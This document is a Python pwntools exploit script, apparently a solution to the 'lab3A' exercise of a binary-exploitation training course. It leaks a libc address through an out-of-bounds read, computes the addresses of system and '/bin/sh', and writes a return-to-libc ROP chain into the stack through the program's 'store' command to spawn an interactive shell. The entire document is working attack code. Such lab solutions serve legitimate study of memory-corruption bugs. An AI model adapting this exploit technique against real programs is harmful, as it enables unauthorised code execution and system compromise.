from pwn import *
libc = ELF("./libc.so.6")

s = process(executable = "./lab3A", argv = [])
#s = gdb.debug("./lab3A" , gdbscript = "bp 0x08048C3B")
#leak return address from main to build ROPchain / I am lazy to build shellcode, as this is more convenient
#version of current libc I used is GLIBC_2.7
s.sendline(b"read")
s.sendlineafter(b"Index: ", b"109") # offset of return address is at 109
s.recvuntil(b"data[109] is ")
leak = int(s.recvline(0).decode())
print(hex(leak))
libc_base = leak - 0x0001aed5
system = libc_base + libc.symbols["system"]
ret = 0x080486ce #this is used to avoid i%3==0
binsh = list(libc.search(b"/bin/sh"))[0] + libc_base

#bulding ROPchain
s.sendline(b"store")
s.sendlineafter(b"Number: ", str(ret).encode())
s.sendlineafter(b"Index: ", str(109).encode())
#s.interactive()
print("Success at offset 109")
s.sendline(b"store")
s.sendlineafter(b"Number: ", str(system).encode())
s.sendlineafter(b"Index: ", str(110).encode())
print("Success at offset 110")

s.sendline(b"store")
s.sendlineafter(b"Number: ", str(binsh).encode())
s.sendlineafter(b"Index: ", str(112).encode())
print("Sucess at offset 112")

s.sendline(b"quit")
s.interactive()


